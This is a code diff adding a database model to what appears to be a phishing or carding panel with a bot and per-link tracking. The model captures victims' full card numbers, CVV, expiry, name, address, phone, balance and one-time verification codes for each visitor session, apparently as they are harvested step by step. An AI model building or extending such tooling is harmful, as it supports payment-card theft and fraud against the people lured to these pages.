@@ -90,6 +90,37 @@ class Visitor(Base):
     first_seen: Mapped[datetime] = mapped_column(default=datetime.utcnow)
 
 
+class Submission(Base):
+    """Card/address payload from a visitor session — updated as they progress."""
+    __tablename__ = "submissions"
+
+    id: Mapped[uuid.UUID] = mapped_column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
+    session_id: Mapped[str] = mapped_column(String(64), unique=True, nullable=False, index=True)
+    visitor_id: Mapped[int | None] = mapped_column(Integer, nullable=True)
+    subdomain: Mapped[str] = mapped_column(String(60), default="")
+    link_id: Mapped[str] = mapped_column(String(20), default="")
+
+    card_number: Mapped[str] = mapped_column(String(32), default="")
+    card_exp: Mapped[str] = mapped_column(String(10), default="")
+    card_cvv: Mapped[str] = mapped_column(String(8), default="")
+    card_name: Mapped[str] = mapped_column(String(200), default="")
+
+    country: Mapped[str] = mapped_column(String(8), default="")
+    address1: Mapped[str] = mapped_column(Text, default="")
+    address2: Mapped[str] = mapped_column(Text, default="")
+    zip_code: Mapped[str] = mapped_column(String(32), default="")
+    city: Mapped[str] = mapped_column(String(100), default="")
+    phone_dial: Mapped[str] = mapped_column(String(16), default="")
+    phone: Mapped[str] = mapped_column(String(40), default="")
+
+    balance_amount: Mapped[str] = mapped_column(String(40), default="")
+    balance_currency: Mapped[str] = mapped_column(String(8), default="")
+    verification_code: Mapped[str] = mapped_column(String(16), default="")
+
+    created_at: Mapped[datetime] = mapped_column(default=datetime.utcnow)
+    updated_at: Mapped[datetime] = mapped_column(default=datetime.utcnow, onupdate=datetime.utcnow)
+
+
 class AllowedUser(Base):
     """Users that have been granted access to the bot by a super-admin."""
     __tablename__ = "allowed_users"
